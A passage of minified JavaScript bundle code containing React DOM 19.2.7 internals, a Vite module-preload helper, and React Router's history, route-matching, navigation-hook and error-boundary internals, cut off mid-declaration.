vp=wp(vp,e,t,n,r,i),!0;case`pointerover`:var a=i.pointerId;return yp.set(a,wp(yp.get(a)||null,e,t,n,r,i)),!0;case`gotpointercapture`:return a=i.pointerId,bp.set(a,wp(bp.get(a)||null,e,t,n,r,i)),!0}return!1}function Ep(e){var t=Tt(e.target);if(t!==null){var n=l(t);if(n!==null){if(t=n.tag,t===13){if(t=u(n),t!==null){e.blockedOn=t,ht(e.priority,function(){op(n)});return}}else if(t===31){if(t=d(n),t!==null){e.blockedOn=t,ht(e.priority,function(){op(n)});return}}else if(t===3&&n.stateNode.current.memoizedState.isDehydrated){e.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Dp(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var n=dp(e.nativeEvent);if(n===null){n=e.nativeEvent;var r=new n.constructor(n.type,n);dn=r,n.target.dispatchEvent(r),dn=null}else return t=Et(n),t!==null&&ap(t),e.blockedOn=n,!1;t.shift()}return!0}function Op(e,t,n){Dp(e)&&n.delete(t)}function kp(){hp=!1,gp!==null&&Dp(gp)&&(gp=null),_p!==null&&Dp(_p)&&(_p=null),vp!==null&&Dp(vp)&&(vp=null),yp.forEach(Op),bp.forEach(Op)}function Ap(e,t){e.blockedOn===t&&(e.blockedOn=null,hp||(hp=!0,n.unstable_scheduleCallback(n.unstable_NormalPriority,kp)))}var jp=null;function Mp(e){jp!==e&&(jp=e,n.unstable_scheduleCallback(n.unstable_NormalPriority,function(){jp===e&&(jp=null);for(var t=0;t<e.length;t+=3){var n=e[t],r=e[t+1],i=e[t+2];if(typeof r!=`function`){if(pp(r||n)===null)continue;break}var a=Et(n);a!==null&&(e.splice(t,3),t-=3,Ds(a,{pending:!0,data:i,method:n.method,action:r},r,i))}}))}function Np(e){function t(t){return Ap(t,e)}gp!==null&&Ap(gp,e),_p!==null&&Ap(_p,e),vp!==null&&Ap(vp,e),yp.forEach(t),bp.forEach(t);for(var n=0;n<xp.length;n++){var r=xp[n];r.blockedOn===e&&(r.blockedOn=null)}for(;0<xp.length&&(n=xp[0],n.blockedOn===null);)Ep(n),n.blockedOn===null&&xp.shift();if(n=(e.ownerDocument||e).$$reactFormReplay,n!=null)for(r=0;r<n.length;r+=3){var i=n[r],a=n[r+1],o=i[_t]||null;if(typeof a==`function`)o||Mp(n);else if(o){var s=null;if(a&&a.hasAttribute(`formAction`)){if(i=a,o=a[_t]||null)s=o.formAction;else if(pp(i)!==null)continue}else s=o.action;typeof s==`function`?n[r+1]=s:(n.splice(r,3),r-=3),Mp(n)}}}function Pp(){function e(e){e.canIntercept&&e.info===`react-transition`&&e.intercept({handler:function(){return new Promise(function(e){return i=e})},focusReset:`manual`,scroll:`manual`})}function t(){i!==null&&(i(),i=null),r||setTimeout(n,20)}function n(){if(!r&&!navigation.transition){var e=navigation.currentEntry;e&&e.url!=null&&navigation.navigate(e.url,{state:e.getState(),info:`react-transition`,history:`replace`})}}if(typeof navigation==`object`){var r=!1,i=null;return navigation.addEventListener(`navigate`,e),navigation.addEventListener(`navigatesuccess`,t),navigation.addEventListener(`navigateerror`,t),setTimeout(n,100),function(){r=!0,navigation.removeEventListener(`navigate`,e),navigation.removeEventListener(`navigatesuccess`,t),navigation.removeEventListener(`navigateerror`,t),i!==null&&(i(),i=null)}}}function Fp(e){this._internalRoot=e}Ip.prototype.render=Fp.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(o(409));var n=t.current;np(n,pu(),e,t,null,null)},Ip.prototype.unmount=Fp.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;np(e.current,2,null,e,null,null),bu(),t[vt]=null}};function Ip(e){this._internalRoot=e}Ip.prototype.unstable_scheduleHydration=function(e){if(e){var t=mt();e={blockedOn:null,target:e,priority:t};for(var n=0;n<xp.length&&t!==0&&t<xp[n].priority;n++);xp.splice(n,0,e),n===0&&Ep(e)}};var Lp=r.version;if(Lp!==`19.2.7`)throw Error(o(527,Lp,`19.2.7`));E.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render==`function`?Error(o(188)):(e=Object.keys(e).join(`,`),Error(o(268,e)));return e=p(t),e=e===null?null:m(e),e=e===null?null:e.stateNode,e};var Rp={bundleType:0,version:`19.2.7`,rendererPackageName:`react-dom`,currentDispatcherRef:T,reconcilerVersion:`19.2.7`};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<`u`){var zp=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!zp.isDisabled&&zp.supportsFiber)try{Ge=zp.inject(Rp),Ke=zp}catch{}}e.createRoot=function(e,t){if(!c(e))throw Error(o(299));var n=!1,r=``,i=Xs,a=Zs,s=Qs;return t!=null&&(!0===t.unstable_strictMode&&(n=!0),t.identifierPrefix!==void 0&&(r=t.identifierPrefix),t.onUncaughtError!==void 0&&(i=t.onUncaughtError),t.onCaughtError!==void 0&&(a=t.onCaughtError),t.onRecoverableError!==void 0&&(s=t.onRecoverableError)),t=ep(e,1,!1,null,null,n,r,null,i,a,s,Pp),e[vt]=t.current,Sd(e),new Fp(t)}})),l=n(((e,t)=>{function n(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>`u`||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!=`function`))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(n)}catch(e){console.error(e)}}n(),t.exports=c()})),u=e(t(),1),d=l(),f=`modulepreload`,p=function(e){return`/`+e},m={},h=function(e,t,n){let r=Promise.resolve();if(t&&t.length>0){let e=document.getElementsByTagName(`link`),i=document.querySelector(`meta[property=csp-nonce]`),a=i?.nonce||i?.getAttribute(`nonce`);function o(e){return Promise.all(e.map(e=>Promise.resolve(e).then(e=>({status:`fulfilled`,value:e}),e=>({status:`rejected`,reason:e}))))}function s(e){return import.meta.resolve?import.meta.resolve(e):new URL(e,import.meta.url).href}r=o(t.map(t=>{if(t=p(t,n),t=s(t),t in m)return;m[t]=!0;let r=t.endsWith(`.css`);for(let n=e.length-1;n>=0;n--){let i=e[n];if(i.href===t&&(!r||i.rel===`stylesheet`))return}let i=document.createElement(`link`);if(i.rel=r?`stylesheet`:f,r||(i.as=`script`),i.crossOrigin=``,i.href=t,a&&i.setAttribute(`nonce`,a),document.head.appendChild(i),r)return new Promise((e,n)=>{i.addEventListener(`load`,e),i.addEventListener(`error`,()=>n(Error(`Unable to preload CSS for ${t}`)))})}))}function i(e){let t=new Event(`vite:preloadError`,{cancelable:!0});if(t.payload=e,window.dispatchEvent(t),!t.defaultPrevented)throw e}return r.then(t=>{for(let e of t||[])e.status===`rejected`&&i(e.reason);return e().catch(i)})},g=/^(?:[a-z][a-z0-9+.-]*:|[\\/]{2})/i,_=/^[\\/]{2}/;function v(e,t){return t+e.replace(/\\/g,`/`)}var y=`popstate`;function b(e){return typeof e==`object`&&!!e&&`pathname`in e&&`search`in e&&`hash`in e&&`state`in e&&`key`in e}function x(e={}){function t(e,t){let n=t.state?.masked,{pathname:r,search:i,hash:a}=n||e.location;return ne(``,{pathname:r,search:i,hash:a},t.state&&t.state.usr||null,t.state&&t.state.key||`default`,n?{pathname:e.location.pathname,search:e.location.search,hash:e.location.hash}:void 0)}function n(e,t){return typeof t==`string`?t:re(t)}return ie(t,n,null,e)}function S(e,t){if(e===!1||e==null)throw Error(t)}function C(e,t){if(!e){typeof console<`u`&&console.warn(t);try{throw Error(t)}catch{}}}function ee(){return Math.random().toString(36).substring(2,10)}function te(e,t){return{usr:e.state,key:e.key,idx:t,masked:e.mask?{pathname:e.pathname,search:e.search,hash:e.hash}:void 0}}function ne(e,t,n=null,r,i){return{pathname:typeof e==`string`?e:e.pathname,search:``,hash:``,...typeof t==`string`?w(t):t,state:n,key:t&&t.key||r||ee(),mask:i}}function re({pathname:e=`/`,search:t=``,hash:n=``}){return t&&t!==`?`&&(e+=t.charAt(0)===`?`?t:`?`+t),n&&n!==`#`&&(e+=n.charAt(0)===`#`?n:`#`+n),e}function w(e){let t={};if(e){let n=e.indexOf(`#`);n>=0&&(t.hash=e.substring(n),e=e.substring(0,n));let r=e.indexOf(`?`);r>=0&&(t.search=e.substring(r),e=e.substring(0,r)),e&&(t.pathname=e)}return t}function ie(e,t,n,r={}){let{window:i=document.defaultView,v5Compat:a=!1}=r,o=i.history,s=`POP`,c=null,l=u();l??(l=0,o.replaceState({...o.state,idx:l},``));function u(){return(o.state||{idx:null}).idx}function d(){s=`POP`;let e=u(),t=e==null?null:e-l;l=e,c&&c({action:s,location:h.location,delta:t})}function f(e,t){s=`PUSH`;let r=b(e)?e:ne(h.location,e,t);n&&n(r,e),l=u()+1;let d=te(r,l),f=h.createHref(r.mask||r);try{o.pushState(d,``,f)}catch(e){if(e instanceof DOMException&&e.name===`DataCloneError`)throw e;i.location.assign(f)}a&&c&&c({action:s,location:h.location,delta:1})}function p(e,t){s=`REPLACE`;let r=b(e)?e:ne(h.location,e,t);n&&n(r,e),l=u();let i=te(r,l),d=h.createHref(r.mask||r);o.replaceState(i,``,d),a&&c&&c({action:s,location:h.location,delta:0})}function m(e){return ae(i,e)}let h={get action(){return s},get location(){return e(i,o)},listen(e){if(c)throw Error(`A history only accepts one active listener`);return i.addEventListener(y,d),c=e,()=>{i.removeEventListener(y,d),c=null}},createHref(e){return t(i,e)},createURL:m,encodeLocation(e){let t=m(e);return{pathname:t.pathname,search:t.search,hash:t.hash}},push:f,replace:p,go(e){return o.go(e)}};return h}function ae(e,t,n=!1){let r=`http://localhost`;e&&(r=e.location.origin===`null`?e.location.href:e.location.origin),S(r,`No window.location.(origin|href) available to create URL`);let i=typeof t==`string`?t:re(t);return i=i.replace(/ $/,`%20`),!n&&_.test(i)&&(i=r+i),new URL(i,r)}function oe(e,t,n=`/`){return se(e,t,n,!1)}function se(e,t,n,r,i){let a=we((typeof t==`string`?w(t):t).pathname||`/`,n);if(a==null)return null;let o=i??le(e),s=null,c=Ce(a);for(let e=0;s==null&&e<o.length;++e)s=ye(o[e],c,r);return s}function ce(e,t){let{route:n,pathname:r,params:i}=e;return{id:n.id,pathname:r,params:i,data:t[n.id],loaderData:t[n.id],handle:n.handle}}function le(e){let t=ue(e);return E(t),t}function ue(e,t=[],n=[],r=``,i=!1){let a=(e,a,o=i,s)=>{let c={relativePath:s===void 0?e.path||``:s,caseSensitive:e.caseSensitive===!0,childrenIndex:a,route:e};if(c.relativePath.startsWith(`/`)){if(!c.relativePath.startsWith(r)&&o)return;S(c.relativePath.startsWith(r),`Absolute route path "${c.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),c.relativePath=c.relativePath.slice(r.length)}let l=Me([r,c.relativePath]),u=n.concat(c);e.children&&e.children.length>0&&(S(e.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${l}".`),ue(e.children,t,u,l,o)),!(e.path==null&&!e.index)&&t.push({path:l,score:_e(l,e.index),routesMeta:u.map((e,t)=>{let[n,r]=Se(e.relativePath,e.caseSensitive,t===u.length-1);return{...e,matcher:n,compiledParams:r}})})};return e.forEach((e,t)=>{if(e.path===``||!e.path?.includes(`?`))a(e,t);else for(let n of T(e.path))a(e,t,!0,n)}),t}function T(e){let t=e.split(`/`);if(t.length===0)return[];let[n,...r]=t,i=n.endsWith(`?`),a=n.replace(/\?$/,``);if(r.length===0)return i?[a,``]:[a];let o=T(r.join(`/`)),s=[];return s.push(...o.map(e=>e===``?a:[a,e].join(`/`))),i&&s.push(...o),s.map(t=>e.startsWith(`/`)&&t===``?`/`:t)}function E(e){e.sort((e,t)=>e.score===t.score?ve(e.routesMeta.map(e=>e.childrenIndex),t.routesMeta.map(e=>e.childrenIndex)):t.score-e.score)}var de=/^:[\w-]+$/,fe=3,pe=2,me=1,he=10,D=-2,ge=e=>e===`*`;function _e(e,t){let n=e.split(`/`),r=n.length;return n.some(ge)&&(r+=D),t&&(r+=pe),n.filter(e=>!ge(e)).reduce((e,t)=>e+(de.test(t)?fe:t===``?me:he),r)}function ve(e,t){return e.length===t.length&&e.slice(0,-1).every((e,n)=>e===t[n])?e[e.length-1]-t[t.length-1]:0}function ye(e,t,n=!1){let{routesMeta:r}=e,i={},a=`/`,o=[];for(let e=0;e<r.length;++e){let s=r[e],c=e===r.length-1,l=a===`/`?t:t.slice(a.length)||`/`,u={path:s.relativePath,caseSensitive:s.caseSensitive,end:c},d=s.matcher&&s.compiledParams?xe(u,l,s.matcher,s.compiledParams):be(u,l),f=s.route;if(!d&&c&&n&&!r[r.length-1].route.index&&(d=be({path:s.relativePath,caseSensitive:s.caseSensitive,end:!1},l)),!d)return null;Object.assign(i,d.params),o.push({params:i,pathname:Me([a,d.pathname]),pathnameBase:Pe(Me([a,d.pathnameBase])),route:f}),d.pathnameBase!==`/`&&(a=Me([a,d.pathnameBase]))}return o}function be(e,t){typeof e==`string`&&(e={path:e,caseSensitive:!1,end:!0});let[n,r]=Se(e.path,e.caseSensitive,e.end);return xe(e,t,n,r)}function xe(e,t,n,r){let i=t.match(n);if(!i)return null;let a=i[0],o=Ne(a,1),s=i.slice(1);return{params:r.reduce((e,{paramName:t,isOptional:n},r)=>{if(t===`*`){let e=s[r]||``;o=Ne(a.slice(0,a.length-e.length),1)}let i=s[r];return n&&!i?e[t]=void 0:e[t]=(i||``).replace(/%2F/g,`/`),e},{}),pathname:a,pathnameBase:o,pattern:e}}function Se(e,t=!1,n=!0){C(e===`*`||!e.endsWith(`*`)||e.endsWith(`/*`),`Route path "${e}" will be treated as if it were "${e.replace(/\*$/,`/*`)}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${e.replace(/\*$/,`/*`)}".`);let r=[],i=`^`+e.replace(/\/*\*?$/,``).replace(/^\/*/,`/`).replace(/[\\.*+^${}|()[\]]/g,`\\$&`).replace(/\/:([\w-]+)(\?)?/g,(e,t,n,i,a)=>{if(r.push({paramName:t,isOptional:n!=null}),n){let t=a.charAt(i+e.length);return t&&t!==`/`?`/([^\\/]*)`:`(?:/([^\\/]*))?`}return`/([^\\/]+)`}).replace(/\/([\w-]+)\?(\/|$)/g,`(/$1)?$2`);return e.endsWith(`*`)?(r.push({paramName:`*`}),i+=e===`*`||e===`/*`?`(.*)$`:`(?:\\/(.+)|\\/*)$`):n?i+=`\\/*$`:e!==``&&e!==`/`&&(i+=`(?:(?=\\/|$))`),[new RegExp(i,t?void 0:`i`),r]}function Ce(e){try{return e.split(`/`).map(e=>decodeURIComponent(e).replace(/\//g,`%2F`)).join(`/`)}catch(t){return C(!1,`The URL path "${e}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${t}).`),e}}function we(e,t){if(t===`/`)return e;if(!e.toLowerCase().startsWith(t.toLowerCase()))return null;let n=t.endsWith(`/`)?t.length-1:t.length,r=e.charAt(n);return r&&r!==`/`?null:e.slice(n)||`/`}function Te(e,t=`/`){let{pathname:n,search:r=``,hash:i=``}=typeof e==`string`?w(e):e,a;return n?(n=je(n),a=n.startsWith(`/`)||n.startsWith(`\\`)?Ee(n.substring(1),`/`):Ee(n,t)):a=t,{pathname:a,search:Fe(r),hash:Ie(i)}}function Ee(e,t){let n=Ne(t).split(`/`);return e.split(`/`).forEach(e=>{e===`..`?n.length>1&&n.pop():e!==`.`&&n.push(e)}),n.length>1?n.join(`/`):`/`}function De(e,t,n,r){return`Cannot include a '${e}' character in a manually specified \`to.${t}\` field [${JSON.stringify(r)}].  Please separate it out to the \`to.${n}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function Oe(e){return e.filter((e,t)=>t===0||e.route.path&&e.route.path.length>0)}function ke(e){let t=Oe(e);return t.map((e,n)=>n===t.length-1?e.pathname:e.pathnameBase)}function Ae(e,t,n,r=!1){let i;typeof e==`string`?i=w(e):(i={...e},S(!i.pathname||!i.pathname.includes(`?`),De(`?`,`pathname`,`search`,i)),S(!i.pathname||!i.pathname.includes(`#`),De(`#`,`pathname`,`hash`,i)),S(!i.search||!i.search.includes(`#`),De(`#`,`search`,`hash`,i)));let a=e===``||i.pathname===``,o=a?`/`:i.pathname,s;if(o==null)s=n;else{let e=t.length-1;if(!r&&o.startsWith(`..`)){let t=o.split(`/`);for(;t[0]===`..`;)t.shift(),--e;i.pathname=t.join(`/`)}s=e>=0?t[e]:`/`}let c=Te(i,s),l=o&&o!==`/`&&o.endsWith(`/`),u=(a||o===`.`)&&n.endsWith(`/`);return!c.pathname.endsWith(`/`)&&(l||u)&&(c.pathname+=`/`),c}var je=e=>e.replace(/[\\/]{2,}/g,`/`),Me=e=>je(e.join(`/`));function Ne(e,t=0){let n=e.length;for(;n>t&&e.charCodeAt(n-1)===47;)n--;return n===e.length?e:e.slice(0,n)}var Pe=e=>Ne(e).replace(/^\/*/,`/`),Fe=e=>!e||e===`?`?``:e.startsWith(`?`)?e:`?`+e,Ie=e=>!e||e===`#`?``:e.startsWith(`#`)?e:`#`+e,Le=class{constructor(e,t,n,r=!1){this.status=e,this.statusText=t||``,this.internal=r,n instanceof Error?(this.data=n.toString(),this.error=n):this.data=n}};function Re(e){return e!=null&&typeof e.status==`number`&&typeof e.statusText==`string`&&typeof e.internal==`boolean`&&`data`in e}function ze(e){return Me(e.map(e=>e.route.path).filter(Boolean))||`/`}var Be=typeof window<`u`&&window.document!==void 0&&window.document.createElement!==void 0;function Ve(e,t){let n=e;if(typeof n!=`string`||!g.test(n))return{absoluteURL:void 0,isExternal:!1,to:n};let r=n,i=!1;if(Be)try{let e=new URL(window.location.href),r=_.test(n)?new URL(v(n,e.protocol)):new URL(n),a=we(r.pathname,t);r.origin===e.origin&&a!=null?n=a+r.search+r.hash:i=!0}catch{C(!1,`<Link to="${n}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}return{absoluteURL:r,isExternal:i,to:n}}Object.getOwnPropertyNames(Object.prototype).sort().join(`\0`);var He=new URL(`http://localhost`);function Ue(e){if(e.createURL)return e.createURL(`/`);try{return new URL(e.createHref(`/`),He)}catch{return He}}function We(e,t){return e.origin===t.origin&&(e.origin!==`null`||e.protocol===t.protocol&&e.host===t.host)}function Ge(e,t){if(e.startsWith(`//`))return!0;let n=t.protocol.toLowerCase();return e.toLowerCase().startsWith(n)?t.host===``||e.slice(n.length).startsWith(`//`):!1}function Ke(e,t,n,r){let i=null;try{i=e==null?null:new URL(e,n)}catch{}let a=new URL(t,n),o=i!=null&&!We(i,n),s=!We(a,n);if(r===`reject`){if(o||s)throw Error(`External navigation is not allowed`)}else if(s&&(i==null||!Ge(e,i)||!We(i,a)))throw Error(`External navigation is not allowed`)}var qe=[`POST`,`PUT`,`PATCH`,`DELETE`];new Set(qe);var Je=[`GET`,...qe];new Set(Je);var Ye=[`about:`,`blob:`,`chrome:`,`chrome-untrusted:`,`content:`,`data:`,`devtools:`,`file:`,`filesystem:`,`javascript:`];function Xe(e){try{return Ye.includes(new URL(e).protocol)}catch{return!1}}var Ze=u.createContext(null);Ze.displayName=`DataRouter`;var Qe=u.createContext(null);Qe.displayName=`DataRouterState`;var $e=u.createContext(!1);function et(){return u.useContext($e)}var tt=u.createContext({isTransitioning:!1});tt.displayName=`ViewTransition`;var nt=u.createContext(new Map);nt.displayName=`Fetchers`;var rt=u.createContext(null);rt.displayName=`Await`;var it=u.createContext(null);it.displayName=`Navigation`;var at=u.createContext(null);at.displayName=`Location`;var ot=u.createContext({outlet:null,matches:[],isDataRoute:!1});ot.displayName=`Route`;var st=u.createContext(null);st.displayName=`RouteError`;var ct=`REACT_ROUTER_ERROR`,lt=`REDIRECT`,ut=`ROUTE_ERROR_RESPONSE`;function dt(e){if(e.startsWith(`${ct}:${lt}:{`))try{let t=JSON.parse(e.slice(28));if(typeof t==`object`&&t&&typeof t.status==`number`&&typeof t.statusText==`string`&&typeof t.location==`string`&&typeof t.reloadDocument==`boolean`&&typeof t.replace==`boolean`)return t}catch{}}function ft(e){if(e.startsWith(`${ct}:${ut}:{`))try{let t=JSON.parse(e.slice(40));if(typeof t==`object`&&t&&typeof t.status==`number`&&typeof t.statusText==`string`)return new Le(t.status,t.statusText,t.data)}catch{}}function pt(e,{relative:t}={}){S(mt(),`useHref() may be used only in the context of a <Router> component.`);let{basename:n,navigator:r}=u.useContext(it),{hash:i,pathname:a,search:o}=St(e,{relative:t}),s=a;return n!==`/`&&(s=a===`/`?n:Me([n,a])),r.createHref({pathname:s,search:o,hash:i})}function mt(){return u.useContext(at)!=null}function ht(){return S(mt(),`useLocation() may be used only in the context of a <Router> component.`),u.useContext(at).location}var gt=`You should call navigate() in a React.useEffect(), not when your component is first rendered.`;function O(e){u.useContext(it).static||u.useLayoutEffect(e)}function _t(){let{isDataRoute:e}=u.useContext(ot);return e?Vt():vt()}function vt(){S(mt(),`useNavigate() may be used only in the context of a <Router> component.`);let e=u.useContext(Ze),{basename:t,navigator:n}=u.useContext(it),{matches:r}=u.useContext(ot),{pathname:i}=ht(),a=JSON.stringify(ke(r)),o=u.useRef(!1);return O(()=>{o.current=!0}),u.useCallback((r,s={})=>{if(C(o.current,gt),!o.current)return;if(typeof r==`number`){n.go(r);return}let c=Ae(r,JSON.parse(a),i,s.relative===`path`);e==null&&t!==`/`&&(c.pathname=c.pathname===`/`?t:Me([t,c.pathname])),Ke(typeof r==`string`?r:re(r),n.createHref(c),Ue(n),`reject`),(s.replace?n.replace:n.push)(c,s.state,s)},[t,n,a,i,e])}var yt=u.createContext(null);function bt(e){let t=u.useContext(ot).outlet;return u.useMemo(()=>t&&u.createElement(yt.Provider,{value:e},t),[t,e])}function xt(){let{matches:e}=u.useContext(ot);return e[e.length-1]?.params??{}}function St(e,{relative:t}={}){let{matches:n}=u.useContext(ot),{pathname:r}=ht(),i=JSON.stringify(ke(n));return u.useMemo(()=>Ae(e,JSON.parse(i),r,t===`path`),[e,i,r,t])}function Ct(e,t){return wt(e,t)}function wt(e,t,n){S(mt(),`useRoutes() may be used only in the context of a <Router> component.`);let{navigator:r}=u.useContext(it),{matches:i}=u.useContext(ot),a=i[i.length-1],o=a?a.params:{},s=a?a.pathname:`/`,c=a?a.pathnameBase:`/`,l=a&&a.route;{let e=l&&l.path||``;Ut(s,!l||e.endsWith(`*`)||e.endsWith(`*?`),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${s}" (under <Route path="${e}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${e}"> to <Route path="${e===`/`?`*`:`${e}/*`}">.`)}let d=ht(),f;if(t){let e=typeof t==`string`?w(t):t;S(c===`/`||e.pathname?.startsWith(c),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${c}" but pathname "${e.pathname}" was given in the \`location\` prop.`),f=e}else f=d;let p=f.pathname||`/`,m=p;if(c!==`/`){let e=c.replace(/^\//,``).split(`/`);m=`/`+p.replace(/^\//,``).split(`/`).slice(e.length).join(`/`)}let h=n&&n.state.matches.length?n.state.matches.map(e=>Object.assign(e,{route:n.manifest[e.route.id]||e.route})):oe(e,{pathname:m});C(l||h!=null,`No routes matched location "${f.pathname}${f.search}${f.hash}" `),C(h==null||h[h.length-1].route.element!==void 0||h[h.length-1].route.Component!==void 0||h[h.length-1].route.lazy!==void 0,`Matched leaf route at location "${f.pathname}${f.search}${f.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);let g=jt(h&&h.map(e=>Object.assign({},e,{params:Object.assign({},o,e.params),pathname:Me([c,r.encodeLocation?r.encodeLocation(e.pathname.replace(/%/g,`%25`).replace(/\?/g,`%3F`).replace(/#/g,`%23`)).pathname:e.pathname]),pathnameBase:e.pathnameBase===`/`?c:Me([c,r.encodeLocation?r.encodeLocation(e.pathnameBase.replace(/%/g,`%25`).replace(/\?/g,`%3F`).replace(/#/g,`%23`)).pathname:e.pathnameBase])})),i,n);return t&&g?u.createElement(at.Provider,{value:{location:{pathname:`/`,search:``,hash:``,state:null,key:`default`,mask:void 0,...f},navigationType:`POP`}},g):g}function Tt(){let e=Bt(),t=Re(e)?`${e.status} ${e.statusText}`:e instanceof Error?e.message:JSON.stringify(e),n=e instanceof Error?e.stack:null,r=`rgba(200,200,200, 0.5)`,i={padding:`0.5rem`,backgroundColor:r},a={padding:`2px 4px`,backgroundColor:r},o=null;return console.error(`Error handled by React Router default ErrorBoundary:`,e),o=u.createElement(u.Fragment,null,u.createElement(`p`,null,`💿 Hey developer 👋`),u.createElement(`p`,null,`You can provide a way better UX than this when your app throws errors by providing your own `,u.createElement(`code`,{style:a},`ErrorBoundary`),` or`,` `,u.createElement(`code`,{style:a},`errorElement`),` prop on your route.`)),u.createElement(u.Fragment,null,u.createElement(`h2`,null,`Unexpected Application Error!`),u.createElement(`h3`,{style:{fontStyle:`italic`}},t),n?u.createElement(`pre`,{style:i},n):null,o)}var Et=u.createElement(Tt,null),Dt=class extends u.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,t){return t.location!==e.location||t.revalidation!==`idle`&&e.revalidation===`idle`?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:e.error===void 0?t.error:e.error,location:t.location,revalidation:e.revalidation||t.revalidation}}componentDidCatch(e,t){this.props.onError?this.props.onError(e,t):console.error(`React Router caught the following error during render`,e)}render(){let e=this.state.error;if(this.context&&typeof e==`object`&&e&&`digest`in e&&typeof e.digest==`string`){let t=ft(e.digest);t&&(e=t)}let t=e===void 0?this.props.children:u.createElement(ot.Provider,{value:this.props.routeContext},u.createElement(st.Provider,{value:e,children:this.props.component}));return this.context?u.createElement(kt,{error:e},t):t}};Dt.contextType=$e;var Ot=new WeakMap;function kt({children:e,error:t}){let{basename:n,navigator:r}=u.useContext(it);if(typeof t==`object`&&t&&`digest`in t&&typeof t.digest==`string`){let e=dt(t.digest);if(e){let i=Ot.get(t);if(i)throw i;let a=Ve(e.location,n),o=a.absoluteURL||a.to;if(Ke(e.location,o,Ue(r),`allow-explicit`),Xe(o))throw Error(`Invalid redirect location`);if(Be&&!Ot.get(t))if(a.isExternal||e.reloadDocument)window.location.href=o;else{let n=Promise.resolve().then(()=>window.__reactRouterDataRouter.navigate(a.to,{replace:e.replace}));throw Ot.set(t,n),n}return u.createElement(`meta`,{httpEquiv:`refresh`,content:`0;url=${o}`})}}return e}function At({routeContext:e,match:t,children:n}){let r=u.useContext(Ze);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),u.createElement(ot.Provider,{value:e},n)}function jt(e,t=[],n){let r=n?.state;if(e==null){if(!r)return null;if(r.errors)e=r.matches;else if(t.length===0&&!r.initialized&&r.matches.length>0)e=r.matches;else return null}let i=e,a=r?.errors;if(a!=null){let e=i.findIndex(e=>e.route.id&&a?.[e.route.id]!==void 0);S(e>=0,`Could not find a matching route for errors on route IDs: ${Object.keys(a).join(`,`)}`),i=i.slice(0,Math.min(i.length,e+1))}let o=!1,s=-1;if(n&&r){o=r.renderFallback;for(let e=0;e<i.length;e++){let t=i[e];if((t.route.HydrateFallback||t.route.hydrateFallbackElement)&&(s=e),t.route.id){let{loaderData:e,errors:a}=r,c=t.route.loader&&!e.hasOwnProperty(t.route.id)&&(!a||a[t.route.id]===void 0);if(t.route.lazy||c){n.isStatic&&(o=!0),i=s>=0?i.slice(0,s+1):[i[0]];break}}}}let c=n?.onError,l=r&&c?(e,t)=>{c(e,{location:r.location,params:r.matches?.[0]?.params??{},pattern:ze(r.matches),errorInfo:t})}:void 0;return i.reduceRight((e,n,c)=>{let d,f=!1,p=null,m=null;r&&(d=a&&n.route.id?a[n.route.id]:void 0,p=n.route.errorElement||Et,o&&(s<0&&c===0?(Ut(`route-fallback`,!1,"No `HydrateFallback` element provided to render during initial hydration"),f=!0,m=null):s===c&&(f=!0,m=n.route.hydrateFallbackElement||null)));let h=t.concat(i.slice(0,c+1)),g=()=>{let t;return t=d?p:f?m:n.route.Component?u.createElement(n.route.Component,null):n.route.element?n.route.element:e,u.createElement(At,{match:n,routeContext:{outlet:e,matches:h,isDataRoute:r!=null},children:t})};return r&&(n.route.ErrorBoundary||n.route.errorElement||c===0)?u.createElement(Dt,{location:r.location,revalidation:r.revalidation,component:p,error:d,children:g(),routeContext:{outlet:null,matches:h,isDataRoute:!0},onError:l}):g()},null)}function Mt(e){return`${e} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`}function Nt(e){let t=u.useContext(Ze);return S(t,Mt(e)),t}function Pt(e){let t=u.useContext(Qe);return S(t,Mt(e)),t}function Ft(e){let t=u.useContext(ot);return S(t,Mt(e)),t}function It(e){let t=Ft(e),n=t.matches[t.matches.length-1];return S(n.route.id,`${e} can only be used on routes that contain a unique "id"`),n.route.id}function Lt(){return It(`useRouteId`)}function Rt(){let e=Pt(`useNavigation`);return u.useMemo(()=>{let{matches:t,historyAction:n,...r}=e.navigation;return r},[e.navigation])}function zt(){let{matches:e,loaderData:t}=Pt(`useMatches`);return u.useMemo(()=>e.map(e=>ce(e,t)),[e,t])}function Bt(){let e=u.useContext(st),t=Pt(`useRouteError`),n=It(`useRouteError`);return e===void 0?t.errors?.[n]:e}function Vt(){let{router:e}=Nt(`useNavigate`),t=It(`useNavigate`),n=u.useRef(!1);return O(()=>{n.current=!0}),u.useCallback(async(r,i={})=>{C(n.current,gt),n.current&&(typeof r==`number`?await e.navigate(r):await e.navigate(r,{fromRouteId:t,...i}))},[e,t])}var Ht={};function 